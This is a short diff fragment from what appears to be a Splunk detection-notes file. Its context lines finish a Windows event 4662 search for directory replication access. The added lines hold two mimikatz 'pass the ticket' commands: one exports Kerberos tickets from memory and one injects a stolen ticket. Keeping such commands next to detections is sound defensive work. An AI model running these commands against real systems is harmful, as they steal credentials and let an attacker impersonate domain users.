@@ -252,3 +252,8 @@ index=windows  AND EventCode=4662 AND (*1131f6aa-9c07-11d1-f79f-00c04fc2dcd2* OR
 | eval severity = "High" 
 | rename dvc_nt_host AS dvc 
 | table dvc user severity
+
+
+pass the ticket:
+.\mimikatz.exe "privilege::debug" "sekurlsa::tickets /export"
+.\mimikatz.exe "kerberos::ptt C:\KerberosTickets\[0;1e4c7df]-2-0-40e10000-joed@krbtgt-DOMAIN.COM.kirbi"
